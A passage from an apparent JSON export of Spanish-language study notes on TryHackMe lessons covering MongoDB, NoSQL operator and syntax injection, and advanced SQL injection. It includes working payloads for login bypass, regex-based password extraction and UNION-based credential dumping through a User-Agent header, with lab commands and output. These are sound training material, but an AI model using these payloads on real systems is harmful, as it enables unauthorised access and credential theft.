    "content": "<h2>Extraer Contrase√±as de Usuarios</h2>\nAhora tenemos acceso a todas las cuentas en la aplicaci√≥n. Sin embargo, es importante intentar extraer la contrase√±a usada ya que puede haber sido reutilizada. Para conseguirlo, abusaremos el operador `$regex` para preguntar una serie de preguntas al servidor que nos permitan recuperar las contrase√±as v√≠a un proceso que se asemeja jugar al ahorcado.\n\nPrimero, tomaremos uno de los usuarios descubiertos antes y trataremos de adivinar la longitud de la contrase√±a. Usaremos el siguiente payload para hacerlo:\n\n![[Pasted image 20260111200719.png]]\n\nDate cuenta de que estamos pregunt√°ndole a la base de datos si hay un usuario con el nombre `admin` y una contrase√±a que coincida con la regex `^.{7}$`. Esto representa una string de 7 caracteres. Como responde con error sabemos que la longitud no es 7. Despu√©s de probar un poco encontramos la longitud.\n\n![[Pasted image 20260111200903.png]]\n\nSabemos que la longitud es 5. Ahora toca averiguar el contenido real, para lo cual modificaremos el payload de la siguiente manera:\n\n![[Pasted image 20260111202751.png]]\n\nAhora estamos trabajando con una expresi√≥n regular de 5 caracteres (una `c` m√°s 4 puntos), coincidiendo con la longitud descubierta y preguntando si coincide con `^c....$`, lo que significa que empieza por `c`. Como la respuesta es `invalid login`, sabemos que no empieza por `c`. Es por esto que probamos otra.\n\n![[Pasted image 20260111203133.png]]\n\nEsto confirma que la primera letra de la contrase√±a es `a`. Repetiremos el proceso para el resto de letras hasta dar con la contrase√±a.",
    "modified": "2026-01-12T00:57:54"
  },
  {
    "title": "2. NoSQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/2-nosql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/2. NoSQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "<h2>Injection is Injection</h2>\nMientras que parece complejo pensar en una inyecci√≥n NoSQL, cuando reducimos los ataques de inyecci√≥n a su esencia, podemos entender las similitudes entre las inyecciones SQL y NoSQL.\n\nLa causa ra√≠z de un ataque de inyecci√≥n es la concatenaci√≥n indebida o input del usuario no confiable en un comando que puede permitir al atacante alterar el propio comando. Con la inyecci√≥n SQL el acercamiento m√°s com√∫n es inyectar comillas simples o dobles. El mismo principio aplica a la inyecci√≥n NoSQL. Si se a√±ade a la query un input no confiable, tenemos la oportunidad de modificar la propia query. Hay dos tipos principales de inyecci√≥n NoSQL:\n\n- **Inyecci√≥n de Sintaxis:** Es similar a la inyecci√≥n SQL, donde tenemos la habilidad de romper la query e inyectar nuestro propio payload. La diferencia principal es la sintaxis usada.\n- **Inyecci√≥n de Operadores:** Incluso si no podemos romper la query, potencialmente podemos inyectar operadores query NoSQL que manipulen el comportamiento de la query permiti√©ndonos realizar ataques como bypasses de autentificaci√≥n.\n\nEn esta unidad nuestro foco principal estar√° centrado en la inyecci√≥n de operadores y las diferentes maneras en las que puede ser usado. Eso es porque no es tan com√∫n encontrar casos de inyecci√≥n de sintaxis. Sin embargo, ya que el input del usuario puede variar, estos mismos filtros pueden ser vulnerables a la inyecci√≥n de operadores. Sin embargo, cubriremos un ejemplo de inyecci√≥n de sintaxis al final de la unidad.\n\n------------------------------------------\n<h2>¬øC√≥mo Inyectar NoSQL?</h2>\nAl mirar a c√≥mo los filtros NoSQL son construidos, bypassearlos para inyectar cualquier payload puede parecer imposible, ya que recaen en crear un array estructurado. Al contrario que la SQLi, donde las queries normalmente se construyen con simple concatenaci√≥n de comandos, las queries NoSQL requieren arrays asociativos anidados. Esto significa que para inyectar NoSQL, uno debe poder inyectar arrays en la aplicaci√≥n.\n\nPor suerte para nosotros, muchos lenguajes de programaci√≥n del lado del servidor nos permiten pasar arrays usando una sintaxis especial en la string query de una petici√≥n HTTP. Para el prop√≥sito de este ejemplo nos centraremos en el siguiente c√≥digo escrito en PHP para una simple p√°gina de login:\n\n```php\n<?php\n$con = new MongoDB\\Driver\\Manager(\"mongodb://localhost:27017\");\n\n\nif(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){\n        $user = $_POST['user'];\n        $pass = $_POST['pass'];\n\n        $q = new MongoDB\\Driver\\Query(['username'=>$user, 'password'=>$pass]);\n        $record = $con->executeQuery('myapp.login', $q );\n        $record = iterator_to_array($record);\n\n        if(sizeof($record)>0){\n                $usr = $record[0];\n\n                session_start();\n                $_SESSION['loggedin'] = true;\n                $_SESSION['uid'] = $usr->username;\n\n                header('Location: /sekr3tPl4ce.php');\n                die();\n        }\n}\nheader('Location: /?err=1');\n\n?>\n```\n\nLa aplicaci√≥n web est√° haciendo una petici√≥n a MongoDB usando la base de datos `myapp` y la colecci√≥n `login`, pidiendo cualquier documento que pase el filtro `['username'=>$user, 'password'=>$pass]`, donde ambos, `$user` y `$pass` se obtienen directamente de par√°metros HTTP POST. Echemos un vistazo a c√≥mo podemos usar la inyecci√≥n de operadores para bypassear la autentificaci√≥n.\n\nSi por lo que sea podemos mandar un array a `$user` y `$pass` con el siguiente contenido:\n\n`$user = ['$ne'=>'xxxx']`\n`$pass = ['$ne'=>'yyyy']`\n\nPodr√≠amos enga√±ar a la base de datos para que nos devuelva todos los documentos donde el usuario sea distinto de `xxxx` y la contrase√±a distinta de `yyyy`. Esto devolver√≠a todos los documentos en la colecci√≥n login. Como resultado, la aplicaci√≥n detectar√≠a un inicio de sesi√≥n exitoso y nos dar√≠a los privilegios del usuario al que corresponda el primer documento obtenido.\n\nEl problema es que no sabemos c√≥mo pasar un array como parte de la petici√≥n HTTP POST. Resulta que PHP y varias otras lenguas permiten pasar un array usando la siguiente notaci√≥n en el cuerpo de la petici√≥n POST.\n\n`user[$ne]=xxxx&pass[$ne]=yyyy`",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "4. Operator Injection - Logging in as Other Users",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/4-operator-injection-logging-in-as-other-users/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/4. Operator Injection - Logging in as Other Users.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "<h2>Iniciar Sesi√≥n como Otros Usuarios</h2>\nHemos conseguido bypassear la pantalla de login de la aplicaci√≥n, pero con la t√©cnica anterior, s√≥lo podemos loguearnos como el primer usuario que sea devuelto por la base de datos. Haciendo uso del operador `$nin`, vamos a modificar nuestro payload para que podamos controlar qu√© usuario queremos obtener.\n\nPrimero, el operador `$nin` nos permite crear un filtro donde el documento deseado tenga un campo, que no est√© en una lista de valores (not in = nin). Por lo que si queremos loguearnos como cualquier usuario excepto el admin, podemos modificar nuestro payload as√≠:\n\n![[Pasted image 20260111130530.png]]\n\nEsto se traducir√≠a a un filtro con la siguiente estructura:\n\n`['username'=>['$nin'=>['admin']], 'password'=>['$ne'=>'aweasdf']]`\n\nLo que le dice a la base de datos que devuelva cualquier usuario para el que el username no sea admin y la contrase√±a no sea aweasdf. Como resultado se nos da acceso a otra cuanta.\n\nPodemos seguir expandiendo la lista de valores a ignorar ajustando el payload.\n\n![[Pasted image 20260111130846.png]]\n\nEsto resultar√≠a en el siguiente filtro:\n\n`['username'=>['$nin'=>['admin', 'jude']], 'password'=>['$ne'=>'aweasdf']]`\n\nEsto puede ser repetido cuantas veces necesites hasta ganar acceso a todas las cuentas disponibles.",
    "modified": "2026-01-12T00:57:54"
  },
  {
    "title": "6. Syntax Injection - Identification and Data Extraction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/6-syntax-injection-identification-and-data-extraction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/6. Syntax Injection - Identification and Data Extraction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "<h2>Encontrar Inyecci√≥n de Sintaxis</h2>\nAhora que hemos cubierto la inyecci√≥n de operadores, echaremos un vistazo al ejemplo de inyecci√≥n de sintaxis. Una aplicaci√≥n python te permite recibir la direcci√≥n de correo electr√≥nico de cualquier usuario que se de. Para usar la aplicaci√≥n autentif√≠cate v√≠a SSH usando `ssh syntax@IP` y las credenciales:\n\n- Username: `syntax`\n- Password: `syntax`\n\nUna vez autentificado, puedes dar el nombre de usuario como input. Empezaremos poniendo `admin`:\n\n```bash\nssh syntax@10.66.162.204\nsyntax@10.66.162.204's password: \nPlease provide the username to receive their email:admin\nadmin@nosql.int\nConnection to 10.66.162.204 closed.\n```\n\nPodemos empezar a comprobar en busca de inyecci√≥n de sintaxis simplemente a√±adiendo `'`, lo que puede resultar en la respuesta de error de abajo:\n\n```shell\nsyntax@10.66.162.204's password: \nPlease provide the username to receive their email:admin'\nTraceback (most recent call last):\n  File \"/home/syntax/script.py\", line 17, in <module>\n    for x in mycol.find({\"$where\": \"this.username == '\" + username + \"'\"}):\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py\", line 1248, in next\n    if len(self.__data) or self._refresh():\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py\", line 1165, in _refresh\n    self.__send_message(q)\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py\", line 1053, in __send_message\n    operation, self._unpack_response, address=self.__address\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py\", line 1272, in _run_operation\n    retryable=isinstance(operation, message._Query),\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py\", line 1371, in _retryable_read\n    return func(session, server, sock_info, read_pref)\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py\", line 1264, in _cmd\n    sock_info, operation, read_preference, self._event_listeners, unpack_res\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/server.py\", line 134, in run_operation\n    _check_command_response(first, sock_info.max_wire_version)\n  File \"/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py\", line 180, in _check_command_response\n    raise OperationFailure(errmsg, code, response, max_wire_version)\npymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}\nConnection to 10.66.162.204 closed.\n```\n\nLa siguiente linea en el mensaje de error muestra que hay inyecci√≥n de comandos:\n\n`for x in mycol.find({\"$where\": \"this.username == '\" + username + \"'\"}):`\n\nPodemos ver que la variable del nombre de usuario est√° directamente concatenada a la query string y que una funci√≥n JavaScript se est√° ejecutando en el comando de b√∫squeda, permiti√©ndonos inyectar en la sintaxis. En este caso, tenemos mensajes de verbose de error para darnos indicaciones de que la inyecci√≥n es posible. Sin embargo, incluso sin mensajes de verbose de error, podemos comprobar la inyecci√≥n de sintaxis dando una condici√≥n true y una false y viendo c√≥mo difiere el output como podemos ver a continuaci√≥n:\n\n```bash\nssh syntax@10.66.162.204\nsyntax@10.66.162.204's password: \nPlease provide the username to receive their email:admin' && 0 && 'x\nConnection to 10.66.162.204 closed.\n\nssh syntax@10.66.162.204\nsyntax@10.66.162.204's password: \nPlease provide the username to receive their email:admin' && 1 && 'x\nadmin@nosql.int\nConnection to 10.66.162.204 closed.\n```\n\n--------------------------------------------\n<h2>Explotando la Inyecci√≥n de Sintaxis</h2>\nAhora que hemos confirmado la inyecci√≥n de sintaxis, podemos usar este punto de inyecci√≥n para obtener las direcciones de correo. Para hacerlo, queremos asegurarnos de que el statement de testing de la condici√≥n siempre de true. Al inyectar en el JavaScript, podemos usar el payload `'||1||'`. Us√©moslo:\n\n```bash\nssh syntax@10.66.162.204\nsyntax@10.66.162.204's password: \nPlease provide the username to receive their email:admin'||1||'\nadmin@nosql.int\npcollins@nosql.int\njsmith@nosql.int\n[...]\nConnection to 10.66.162.204 closed.\n```\n\n-----------------------------\n<h2>La Excepci√≥n a la Regla</h2>\nEs importante apuntar que para que ocurra la inyecci√≥n de sintaxis, el desarrollador tiene que crear queries JavaScript personalizadas. La misma funci√≥n podr√≠a ser realizada usando las funciones de filtrado preinstaladas donde `['username' : username]` devolver√≠a el mismo resultado pero no ser√≠a vulnerable a la inyecci√≥n. Como tal es rara de encontrar, ya que significar√≠a que los desarrolladores no est√°n usando las funciones y filtros incrustados. El ejemplo de arriba es exclusivo de MongoDB. Para otras soluciones NoSQL puede existir pero la sintaxis cambiar √°.",
    "modified": "2026-01-12T00:57:54"
  },
  {
    "title": "1. What is NoSQL",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/1-what-is-nosql/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/1. What is NoSQL.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "Antes de aprender sobre inyecci√≥n NoSQL, veamos c√≥mo funcionan las bases de datos NoSQL. En esta unidad nos centraremos en MongoDB. Aunque hay otras soluciones NoSQL, los principios de mongo pueden aplicarse a estas.\n\n---------------------------------------------\n<h2>MongoDB</h2>\nComo MySQL, MariaDB o PostgreSQL, MongoDB es una base de datos donde puedes almacenar informaci√≥n de forma ordenada. MongoDB permite recuperar subconjuntos de informaci√≥n de forma r√°pida y estructurada. Si est√°s familiarizado con la bases de datos relacionales, puedes asumir que MongoDB funciona de manera similar a cualquier otra. La mayor excepci√≥n es que la informaci√≥n no se guarda en tablas sino en documentos.\n\nPuedes pensar en estos documentos como una estructura de diccionario donde se guardan valores por pares clave-valor. Digamos que estamos creando una aplicaci√≥n web para el departamento HR y queremos guardar informaci√≥n b√°sica de los empleados. Crear√≠as un documento para cada empleado que contuviese la informaci√≥n as√≠:\n\n`{\"_id\" : ObjectId(\"5f077332de2cdf808d26cd74\"), \"username\" : \"lphillips\", \"first_name\" : \"Logan\", \"last_name\" : \"Phillips\", \"age\" : \"65\", \"email\" : \"lphillips@example.com\" }`\n\nMongoDB te permite agrupar m√∫ltiples documentos con una funci√≥n similar juntos en estructuras de jerarqu√≠a superior llamadas colecciones con prop√≥sitos de organizaci√≥n. Las colecciones son el equivalente de las tablas. Continuando con el ejemplo de Recursos Humanos, todos los documentos de los empleados se guardan en una colecci√≥n llamada \"people\" como se muestra en el diagrama inferior.\n\n![[Pasted image 20260110203013.png]]\n\nM√∫ltiples colecciones se agrupan en bases de datos que es el elemento jer√°rquico m√°s alto en MongoDB. En las bases de datos relacionales, el concepto de base de datos agrupa varias tablas juntas. En MongoDB agrupa colecciones relacionadas.\n\n![[Pasted image 20260110203544.png]]\n\n----------------------------------------------\n<h2>Haciendo Peticiones a la Base de Datos</h2>\nComo con cualquier base de datos, se usa un lenguaje especial para recuperar informaci√≥n de la base de datos. Justo como las bases de datos relacionales usan alguna variante de SQL, las bases de datos no relacionales, como MongoDB, usan NoSQL. NoSQL se refiere a cualquier forma de hacer una petici√≥n a una base de datos no SQL, significando que puede depender seg√∫n la base de datos en uso.\n\nCon MongoDB, las queries usan un array asociativo estructurado que contiene grupos de criterios para filtrar la informaci√≥n. Estos filtros ofrecen funcionalidades similares a una cl√°usula WHERE en SQL.\n\nPara entender mejor las queries NoSQL, empecemos asumiendo que tenemos una base de datos con una colecci√≥n de gente conteniendo los siguientes tres documentos:\n\n![[Pasted image 20260110204829.png]]\n\nSi quisi√©ramos construir un filtro para que s√≥lo los documentos donde el apellido es \"Sandler\" fueran devueltos, nuestro filtro ser√≠a:\n\n`['last_name' => 'Sandler']`\n\nComo resultado a esta query, obtendr√≠amos s√≥lo el segundo documento.\n\nSi quisi√©ramos que nos devolviera los documentos donde el g√©nero es masculino y el apellido es \"Phillips\", usar√≠amos el filtro:\n\n`['gender' => 'male', 'last_name' => 'Phillips']`\n\nEsto nos devolver√≠a el primer documento.\n\nSi quisi√©ramos recibir los documentos donde la edad es menor que 50, podr√≠amos usar el siguiente filtro:\n\n`['age' => ['$lt'=>'50']]`\n\nEsto devolver√≠a el segundo y tercer documento. Date cuenta de que usamos el operador `$lt` de forma anidada. Los operadores permiten filtros m√°s complejos anidando condiciones. Una referencia completa de posibles operadores puede encontrarse en el siguiente link:\n\n[MongoDB Operator Reference](https://docs.mongodb.com/manual/reference/operator/query/)",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "0. NoSQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/0-nosql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/0. NoSQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "[[1. What is NoSQL]]\n[[2. NoSQL Injection]]\n[[3. Operator Injection - Bypassing the Login Screen]]\n[[4. Operator Injection - Logging in as Other Users]]\n[[5. Operator Injection - Extracting Users Passwords]]\n[[6. Syntax Injection - Identification and Data Extraction]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Quick Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/2-quick-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/2. Quick Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En la √∫ltima unidad de SQLi, exploramos los fundamentos de SQLi, entendiendo c√≥mom los atacantes explotan vulnerabilidades en las aplicaciones web para manipular queries SQL y acceder a informaci√≥n no autorizada. Cubrimos t√©cnicas esenciales como la SQLi basada en error o en uni√≥n, m√©todos de blind SQLi como la basada en booleanos o en tiempo. Aqu√≠ un repaso r√°pido de lo que ya sabemos:\n\n![[Pasted image 20251229135548.png]]\n\n----------------------------------------\n<h2>In-band SQL Injection</h2>\nEsta t√©cnica est√° considerada una de las m√°s comunes y directas de inyecci√≥n SQL. En esta t√©cnica el atacante usa el mismo canal de comunicaci√≥n para tanto la inyecci√≥n y recuperaci√≥n de informaci√≥n. Hay dos tipos principales de inyecci√≥n SQL in-band.\n\n- **Error-Based SQL Injection:** El atacante manipula la query SQL para producir mensajes de error de la base de datos. Estos mensajes de error suelen contener informaci√≥n sobre la estructura de la base de datos, lo que puede usarse para explotar la base de datos. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. Si la versi√≥n de la base de datos es devuelta en el mensaje de error, revela informaci√≥n sobre esta.\n- **Union-Based SQL Injection:** El atacante usa el operador SQL UNION para combinar los resultados de dos o m√°s statements SELECT en un solo resultado, recuperando as√≠ informaci√≥n de otras tablas. Ejemplo: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.\n\n--------------------------------------------\n<h2>Inferential (Blind) SQL Injection</h2>\nLa inyecci√≥n SQL inferencial no transfiere la informaci√≥n directamente a trav√©s de la aplicaci√≥n web, haciendo explotarla m√°s dif√≠cil. En su lugar, el atacante manda payloads y observa el comportamiento de la aplicaci√≥n y tiempos de respuesta para inferir informaci√≥n sobre la base de datos. Hay dos tipos principales de inyecci√≥n SQL inferencial:\n\n- **Boolean-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos, forzando la aplicaci√≥n a que devuelva un resultado diferente basado en una condici√≥n true o false. Analizando la respuesta de la aplicaci√≥n, el atacante puede inferir si el payload era cierto o no. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`.\n- **Time-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos que retrasa la respuesta por un periodo de tiempo espec√≠fico si la condici√≥n es cierta. Midiendo el tiempo de respuesta, el atacante puede inferir si la condici√≥n es cierta o no. Ejemplo: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`.\n\n--------------------------\n<h2>Out-of-band SQL Injection</h2>\nOut-of-band SQL Injection es usada cuando el atacante no puede usar el mismo canal para lanzar el ataque y reunir resultados o cuando las respuestas del servidor son inestables. Esta t√©cnica se basa en que el servidor de base de datos haga una petici√≥n out-of-band para mandar los resultados de la query al atacante. HTTP es normalmente usado en la inyecci√≥n SQL out-of-band para mandar el resultado de la query al servidor del atacante.\n\nCada tipo de t√©cnica de inyecci√≥n SQL tiene sus ventajas y retos.Entender estas t√©cnicas es crucial para identificar y mitigar vulnerabilidades de injecci√≥n SQL en las aplicaciones web. La inyecci√≥n SQL in-band, es f√°cil de explotar y detectar pero ruidosa y f√°cilmente monitorizable. La inyecci√≥n SQL inferencial es m√°s dif√≠cil de explotar y requiere m√∫ltiples peticiones pero puede ser usada cuando los mensajes detallados de error no est√°n disponibles. La inyecci√≥n SQL out-of-band es menos com√∫n y altamente efectiva, requiere un servidor de control externo y se basa en la habilidad de la base de datos de hacer peticiones out-of-band. Controlando estas t√©cnicas, los pentesters pueden identificar eficientemente vulnerabilidades de inyecci√≥n SQL, ayudando a las organizaciones a securizar sus aplicaciones web contra amenazas.",
    "modified": "2025-12-30T00:53:49"
  },
  {
    "title": "0. Advanced SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/0-advanced-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/0. Advanced SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/1. Introduction]]\n[[2. Quick Recap]]\n[[3. Second-Order SQL Injection]]\n[[4. Filter Evasion Techniques]]\n[[5. Filter Evasion Techniques - continued]]\n[[6. Out-of-band SQL Injection]]\n[[7. Other Techniques]]\n[[8. Automation]]\n[[9. Best Practices]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Other Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/7-other-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/7. Other Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyecci√≥n SQL avanzada involucra un rango de m√©todos sofisticados que van m√°s all√° de ataques b√°sicos. Aqu√≠ hay algunas t√©cnicas avanzadas importantes que los pentesters deber√≠an saber que existen:\n\n---------------------------------------------\n<h2>HTTP Header Injection</h2>\nLos headers HTTP pueden transportar input del usuario, lo que puede ser usado en queries SQL en el lado del servidor. Si estos inputs no son sanitizados, puede llevar a la inyecci√≥n SQL. La t√©cnica involucra manipular headers HTTP (como **User-Agent**, **Referer** o **X-Forwarded-For**) para inyectar comandos SQL. El servidor puede registrar estos headers para usarlos en queries SQL. Por ejemplo, un header User-Agent malicioso puede verse como `User-Agent: ' OR 1=!; --`. Si el servidor incluye el header User-Agent en una query SQL sin sanitizarla, puede resultar en una SQLi.\n\nEn este ejemplo, una aplicaci√≥n web registra los headers User-Agent en una tabla llamada logs en la base de datos. La aplicaci√≥n ofrece un endpoint en `http://IP/httpagent/` que muestra todas las entradas registradas de la tabla logs. Cuando un usuario visita la p√°gina, su navegador manda un header User-Agent, el cual identifica el navegador y sistema operativo. Si este header se introduce en una tabla SQL con prop√≥sito de registro sin sanitizar, puede tener consecuencias devastadoras.\n\nDado el endpoint, un atacante puede intentar inyectar c√≥digo SQL en el header User-Agent para explotar las vulnerabilidades de inyecci√≥n SQL. Por ejemplo, configurando el header User-Agent a un valor malicioso como `User-Agent: ' UNION SELECT username, password FROM user; --`.\n\nAqu√≠ est√° el c√≥digo del lado del servidor que inserta los logs:\n\n```php\n$userAgent = $_SERVER['HTTP_USER_AGENT'];\n$insert_sql = \"INSERT INTO logs (user_Agent) VALUES ('$userAgent')\";\nif ($conn->query($insert_sql) === TRUE) {\n    echo \"<p class='text-green-500'>New logs inserted successfully</p>\";\n} else {\n    echo \"<p class='text-red-500'>Error: \" . $conn->error . \" (Error Code: \" . $conn->errno . \")</p>\";\n}\n\n$sql = \"SELECT * FROM logs WHERE user_Agent = '$userAgent'\";\n..\n... \n```\n\nEl valor del User-Agent es insertado en la tabla logs usando el statement de SQL, INSERT. Si la inserci√≥n resulta exitosa, un mensaje de √©xito se muestra. Un mensaje de error se muestra si falla.\n\n![[Pasted image 20260110161316.png]]\n\n<h4>Preparando el Payload</h4>\nPrepararemos e inyectaremos un payload SQL en el header User-Agent para demostrar c√≥mo la inyecci√≥n SQL puede ser explotada mediante headers HTTP. Nuestro payload ser√° `' UNION SELECT username, password FROM user;#`. Este payload est√° dise√±ado para:\n\n- **Cerrar la string literal existente:** La comilla inicial (`'`), se usa para cerrar la string existente en la query SQL.\n- **Inyectar un statement UNION SELECT:** La parte `UNION SELECT username, password FROM user;` del payload se usa para recuperar las columnas de nombre de usuario y contrase√±a de la tabla `user`.\n- **Comentar el resto de la query:** El car√°cter `#` se usa para comentar el resto de la query SQL asegurando que cualquier c√≥digo SQL que siga sea ignorado.\n\nNecesitamos mandar este payload como parte del header User-Agent en nuestra petici√≥n HTTP para inyectar este payload, lo cual podr√≠a ser hecho usando herramientas como BurpSuite o cURL. Usaremos cURL.\n\n```bash\nuser@tryhackme$ curl -H \"User-Agent: ' UNION SELECT username, password FROM user; # \" http://10.65.188.152/httpagent/\n```\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection </title>\n rel=\"stylesheet\">\n</head>\n<body class=\"bg-gray-100\">\n    <div class=\"container mx-auto p-8\">\n        <h1 class=\"text-4xl font-bold mb-8 text-center\">HTTP Logs</h1>\n        <div class=\"bg-white p-6 rounded-lg shadow-lg\">\n\n<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>\n        </div>\n    </div>\n</body>\n</html>\n```\n\nLa respuesta del servidor ser√° mostrada en la terminal. Si la SQLi es exitosa ver√°s la informaci√≥n extra√≠da en la respuesta.\n\n----------------------------------------------\n<h2>Exploiting Stored Procedures</h2>\nLos procedimientos almacenados son rutinas en la base de datos que pueden realizar varias operaciones como insertar, actualizar o pedir informaci√≥n. Mientras que pueden mejorar la eficiencia y asegurar consistencia, tambi√©n pueden ser vulnerables a inyecciones SQL si no se manejan adecuadamente.\n\n![process flow of stored procedure](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792)\n\nLos procedimientos almacenados son statements SQL precompilados que pueden ser ejecutados como una unidad √∫nica. Se guardan en la base de datos y pueden ser llamados por aplicaciones para realizar tareas espec√≠ficas. Pueden aceptar par√°metros, los cuales los hacen flexibles y poderosos. Sin embargo, si estos par√°metros no se sanitizan adecuadamente, pueden introducir vulnerabilidades de inyecci√≥n SQL.\n\nConsidera un procedimiento almacenado dise√±ado para recuperar informaci√≥n del usuario basado en un nombre de usuario:\n\n```sql\nCREATE PROCEDURE sp_getUserData\n    @username NVARCHAR(50)\nAS\nBEGIN\n    DECLARE @sql NVARCHAR(4000)\n    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''\n    EXEC(@sql)\nEND\n```\n\nEn este ejemplo, el procedimiento almacenado concatena el par√°metro `@username` en una query SQL din√°mica. Este acercamiento es vulnerable a SQLi porque el input no est√° sanitizado.\n\n------------------------------------------\n<h2>XML and JSON Injection</h2>\nLas aplicaciones que parsean datos XML o JSON y usan esa informaci√≥n parseada en queries SQL pueden ser vulnerables a la inyecci√≥n SQL si no sanitizan los inputs adecuadamente. La inyecci√≥n XML y JSON involucra inyectar informaci√≥n maliciosa en estructuras XML o JSON que son usadas despu√©s en queries SQL. Esto puede ocurrir si la aplicaci√≥n usa directamente valores parseados en statements SQL.\n\n```xml\n{\n  \"username\": \"admin' OR '1'='1--\",\n  \"password\": \"password\"\n}\n```\n\nSi la aplicaci√≥n usa los valores directamente en una query como `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'password'`, podr√≠a resultar en una inyecci√≥n.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "8. Automation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/8-automation/",
